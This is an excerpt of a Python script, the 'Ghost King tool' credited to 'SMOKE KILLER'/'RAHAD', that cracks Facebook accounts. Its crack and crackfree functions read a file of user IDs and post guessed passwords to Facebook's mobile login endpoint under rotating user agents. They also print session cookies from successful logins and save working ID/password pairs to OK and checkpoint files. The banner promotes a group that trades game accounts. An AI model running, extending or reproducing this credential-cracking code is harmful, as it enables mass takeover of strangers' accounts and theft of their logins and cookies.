...
print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \x1b[38;5;50m Welcome to Ghost King tool ')
os.system("espeak -a 300 \"Welcome to,Ghost King tool,\"")
time.sleep(2)
#───────────────[ RAHAD-END ]─────────────────────────#
#───────────────[ USER AGENT ]─────────────────────────#
...
\033[1;93m┃  \033[1;31m██████  \033[1;32m██   ██ \033[1;33m ┃  \033[38;5;208m██████  \033[1;34m███████ \033[1;35m   ██    \033[1;93m┃
\033[1;93m┗━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  SMOKE KILLER 
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  R A H A D 
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  3.1
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mFILE-/PAID\033[1;32m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33mFree Fire ID Buy And Sell Bangladesh Official (Dealing By Admin)\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""
os.system('clear')
print(logo)
...
def crack_file():
    ...
    print('\033[1;32m[\033[92;1m•\033[97;1m] Put File Example: /sdcard/KNNG.txt')
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/profile.php?id=100089919849240&mibextid=ZbWKwL")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[GHOST•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;96m[GHOST-2F] \x1b[38;5;205m[UID= {idf} [PASS= {pw}')
                ...
                print(f'\r\x1b[1;96m[GHOST-OK] {idf} • {pw}\n\033[0;93m[🍁] COOKIES • \x1b[1;91m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[GHOST-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•GHOST-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                os.system('espeak -a 300 " Ok,  RAHAD,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
